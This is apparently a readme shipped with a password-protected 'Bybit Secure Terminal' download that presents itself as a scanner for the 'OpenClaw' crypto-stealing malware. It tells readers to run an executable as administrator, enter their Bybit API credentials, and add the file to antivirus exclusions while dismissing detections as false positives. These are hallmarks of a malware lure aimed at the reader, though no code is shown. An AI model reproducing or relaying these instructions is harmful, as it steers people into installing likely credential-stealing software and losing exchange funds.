====================================================
Bybit Secure Terminal – OpenClaw Scanner v1.0
====================================================

Password: bybit2026

FILES INCLUDED:
- BybitTerminal.exe (main terminal + scanner)
- openclaw_db.json (malware signatures)
- readme.txt (this file)

ABOUT OPENCLAW:
386 malicious "skills" disguised as Bybit/Polymarket tools were discovered
in February 2026. They steal API keys and funds.

INSTALLATION:
1. Run BybitTerminal.exe AS ADMINISTRATOR.
2. The tool will scan your system for OpenClaw malware.
3. After scan, secure terminal launches automatically.
4. Log in with your Bybit API credentials (read-only recommended).

FEATURES:
- OpenClaw malware detection
- Browser extension scan
- Secure trading environment
- Real-time API key protection

NOTE: Antivirus may false-positive – it's safe. Add to exclusions.

For updates:
https://github.com/almainthesnow/bybit-secure-terminal

Trade safely!
